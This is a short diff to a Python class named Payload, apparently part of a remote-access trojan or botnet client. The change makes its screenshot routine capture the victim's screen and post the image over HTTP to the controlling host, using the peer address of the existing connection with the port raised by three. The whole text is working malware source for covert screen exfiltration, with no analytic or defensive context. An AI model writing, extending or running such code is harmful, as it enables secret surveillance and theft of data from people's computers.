@@ -877,7 +877,11 @@ class Payload():
         try:
             if 'screenshot' not in globals():
                 self.load('screenshot')
-            return globals()['screenshot'].run()
+            img = globals()['screenshot'].run()
+            data = {"data": img}
+            host, port = self.connection.getpeername()
+            globals()['post']('http://{}:{}'.format(host, port+3), data=data)
+            return 
         except Exception as e:
             result = "{} error: {}".format(self.screenshot.func_name, str(e))
             log(result) 
